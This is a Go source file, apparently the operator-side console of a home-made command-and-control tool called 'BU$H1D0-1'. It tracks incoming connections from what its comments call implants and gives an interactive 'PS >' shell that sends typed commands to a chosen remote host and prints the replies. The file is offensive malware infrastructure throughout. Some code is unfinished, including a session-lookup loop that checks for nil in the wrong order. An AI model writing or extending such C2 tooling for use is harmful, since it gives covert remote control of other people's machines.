package main

import (
	"bufio"
	"fmt"
	"math/rand/v2"
	"net"
	"os"
	"strings"
)

func NewSessionList() *SessionList {
	return &SessionList{
		Stop: make(chan struct{}),
	}
}

// registerListener registers a new listener
func (ll *SessionList) registerSession(port string, conn net.Conn) {
	id := rand.IntN(1000)
	// Create a new Session struct
	newSession := &Session{
		id:     id,
		Port:   port,
		Status: "Active",
		Conn:   conn,
	}

	// Add to the head of the linked list
	newSession.Next = ll.Head
	ll.Head = newSession
}

// displaySessions displays the active sessions
func (ll *SessionList) displaySessions() {
	fmt.Println("Active Sessions:")
	current := ll.Head
	for current != nil {
		fmt.Println("SessionID:", current.id, "- Port:", current.Port, "- Status:", current.Status)
		current = current.Next
	}
}

// func (ll *SessionList) updateSessionStatus(targetPort string, status string, conn net.Conn) {
// 	current := ll.Head
// 	for current.Port != targetPort {
// 		current = current.Next
// 	}
// 	current.Status = status
// 	current.Conn = conn
// }

func (ll *SessionList) closeSessions() {
	// Close the stop channel to signal stop to all goroutines
	//close(ll.Stop)

	current := ll.Head
	for current != nil {
		fmt.Println("Unit on ", current.id, " lost")
		current.Conn.Close()
		current.Conn = nil // Clear the connections list

		current = current.Next
	}

	ll.Head = nil // Reset the listener list
}

// Below be dragons

func shell(conn *net.Conn) {
	reader := bufio.NewReader(os.Stdin)
	for {
		fmt.Print("PS > ")
		command, err := reader.ReadString('\n')
		if err != nil {
			fmt.Println("Error reading input:", err)
			continue
		}
		if command == "\n" {
			continue
		}
		if command == "bg\n" {
			break
		}
		if command == "exit\n" {
			break
		}
		(*conn).Write([]byte(command))
		//time.Sleep(1 * time.Second) Ma ila 3azeh only for testing
		request := make([]byte, 9000)
		read_len, err := (*conn).Read(request)
		if read_len == 0 {
			fmt.Println("Read Length is 0")
		}
		if err != nil {
			os.Exit(0)
		}
		reply := string(request[:read_len])
		fmt.Println(reply)
	}
}

// This is where we left off fix concurency
func openSession(id int, sl *SessionList) {
	//sl.displaySessions()
	current := sl.Head
	if current == nil {
		fmt.Println("Session not found")
		return
	}
	for current.id != id && current != nil {
		current = current.Next
		if current == nil {
			fmt.Println("Session not found")
			return
		}
	}
	fmt.Println("Session Found !")
	fmt.Println("Connecting ...")
	//Impliment some sort of auth. Hash some string. If agent responds with the same hash super. If agent is late kill. If agent responds false kill.
	//current.Conn.Write(([]byte("Success talking to" + string(current.id)))) Quick Test To see if implant gets it via netcat
	fmt.Println("Success !")
	fmt.Println("Usage: shell")
	reader := bufio.NewReader(os.Stdin)

	for {
		fmt.Print("BU$H1D0-1 >>> ")
		command, err := reader.ReadString('\n')
		if err != nil {
			fmt.Println("Error reading input:", err)
			continue
		}
		command = strings.TrimSpace(command)
		switch command {
		case "shell":
			shell(&current.Conn)
		case "bg":
			return
		default:
			fmt.Println("Usage: shell, bg")
		}
	}
}
